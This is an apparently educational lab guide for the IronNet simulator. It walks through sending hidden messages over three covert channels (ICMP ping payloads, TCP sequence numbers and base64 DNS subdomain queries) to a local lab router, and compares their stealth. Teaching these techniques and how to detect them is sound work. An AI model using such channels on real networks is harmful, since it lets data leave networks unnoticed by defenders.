# Demo 34: Covert Channels — Data Hiding in Protocol Fields (Phase 19a)

## Prerequisites

- WSL 2 with Ubuntu
- IronNet built: `cd IronNet/build && cmake ../src -DCMAKE_BUILD_TYPE=Debug && make`
- Two terminal windows

## What this demo shows

- Three covert channel techniques that hide data in normal-looking traffic
- ICMP payload channel: message hidden in ping data
- TCP ISN channel: 4 bytes per SYN hidden in sequence numbers
- DNS subdomain channel: base64-encoded data in DNS query labels
- All channels look like normal traffic to casual observers

## Terminal 1: Start the router

```bash
cd IronNet/build
sudo ./ironstack/ironstack -d ../src/configs/router.conf
```

## Terminal 2: Setup network

```bash
cd IronNet/build
sudo ip addr add 10.0.1.2/24 dev iron0 2>/dev/null
sudo ip link set iron0 up
```

## Channel 1: ICMP Payload (hidden in ping data)

Normal ping packets carry random or zero-filled payload. We hide a message there instead.

```bash
sudo ./ironattack/ironattack covert --target 10.0.1.1 --mode icmp --message "secret data"
```

Expected output:
```
=== Covert Channel Tool (Phase 19a) ===
  Target:  10.0.1.1
  Mode:    icmp
  Message: "secret data" (11 bytes)
  Iface:   iron0

  [ICMP Covert Channel]
  Encoding 11 bytes in ICMP echo payload
  Message: "secret data"
  Appears as: normal ping traffic

  Sent: ICMP echo request with hidden payload (11 bytes)
  Hex payload: 73 65 63 72 65 74 20 64 61 74 61
  To decode: capture with tcpdump, extract ICMP payload starting at byte 8
```

**Terminal 1 shows:** ironstack receives an ICMP echo request and replies — looks like a normal ping.

**Why it's covert:** `tcpdump` shows a ping packet. The payload bytes (`73 65 63 72 65 74...`) look like random data unless you know to decode them as ASCII.

## Channel 2: TCP ISN (hidden in sequence numbers)

Each TCP SYN carries a 32-bit sequence number. We encode 4 bytes of message per SYN.

```bash
sudo ./ironattack/ironattack covert --target 10.0.1.1 --mode isn --message "HELLO WORLD!"
```

Expected output:
```
=== Covert Channel Tool (Phase 19a) ===
  Target:  10.0.1.1
  Mode:    isn
  Message: "HELLO WORLD!" (12 bytes)
  Iface:   iron0

  [TCP ISN Covert Channel]
  Encoding 12 bytes across 3 TCP SYN packets
  Message: "HELLO WORLD!"
  Each SYN carries 4 bytes in its sequence number

  SYN #1: sport=40000 ISN=0x4C4C4548 (bytes: "HELL")
  SYN #2: sport=40001 ISN=0x4F57204F (bytes: "O WO")
  SYN #3: sport=40002 ISN=0x21444C52 (bytes: "RLD!")

  Sent: 3 SYN packets (12 bytes hidden in ISNs)
  To decode: capture SYNs, extract seq numbers, concatenate as bytes
```

**Why it's covert:** TCP sequence numbers are supposed to be random. An observer sees normal SYN packets with "random" ISNs. Only the receiver knows to extract and concatenate the bytes.

## Channel 3: DNS Subdomain (hidden in query labels)

Data is base64-encoded and sent as a DNS subdomain query.

```bash
sudo ./ironattack/ironattack covert --target 10.0.1.1 --mode dns --message "attack at dawn"
```

Expected output:
```
=== Covert Channel Tool (Phase 19a) ===
  Target:  10.0.1.1
  Mode:    dns
  Message: "attack at dawn" (14 bytes)
  Iface:   iron0

  [DNS Subdomain Covert Channel]
  Encoding 14 bytes as base64 in DNS query
  Message: "attack at dawn"
  Base64:  "YXR0YWNrIGF0IGRhd24="
  Query:   YXR0YWNrIGF0IGRhd24=.covert.ironnet.local

  Sent: DNS query for YXR0YWNrIGF0IGRhd24=.covert.ironnet.local
  To decode: capture DNS queries, extract first label, base64 decode
```

**Terminal 1 shows:** DNS server receives query for `YXR0YWNrIGF0IGRhd24=.covert.ironnet.local` → NXDOMAIN (domain doesn't exist, but the data was transmitted).

**Why it's covert:** DNS queries for subdomains are extremely common. The base64 label looks like a CDN hash or tracking parameter. Only the receiver knows to base64-decode it.

## How each channel compares

| Channel | Bandwidth | Stealth | Detection difficulty |
|---------|-----------|---------|---------------------|
| ICMP payload | High (1 msg/ping) | Medium (payload visible) | Low (entropy analysis) |
| TCP ISN | Low (4 bytes/SYN) | High (ISNs look random) | High (need statistical analysis) |
| DNS subdomain | Medium (63 bytes/query) | Medium (base64 visible) | Medium (label entropy) |

## Real-world equivalents

| IronNet channel | Real-world tool |
|-----------------|----------------|
| ICMP payload | `ptunnel`, `icmpsh` (ICMP tunneling) |
| TCP ISN | `covert_tcp` (Rowland 1996) |
| DNS subdomain | `iodine`, `dnscat2` (DNS tunneling) |

## Command reference

| Command | Description |
|---------|-------------|
| `ironattack covert --mode icmp --message <text> --target <ip>` | Hide in ICMP payload |
| `ironattack covert --mode isn --message <text> --target <ip>` | Hide in TCP sequence numbers |
| `ironattack covert --mode dns --message <text> --target <ip>` | Hide in DNS subdomain labels |

## Notes

- All channels require `sudo` (raw socket access)
- ICMP channel: ironstack will reply with echo response (message echoed back)
- ISN channel: ironstack creates TCP connections (SYN_RECV state) as side effect
- DNS channel: ironstack responds with NXDOMAIN (data still transmitted)
- Phase 19b will add timing-based channels (inter-packet delay encoding)
- Phase 19c will add detection mechanisms for these channels
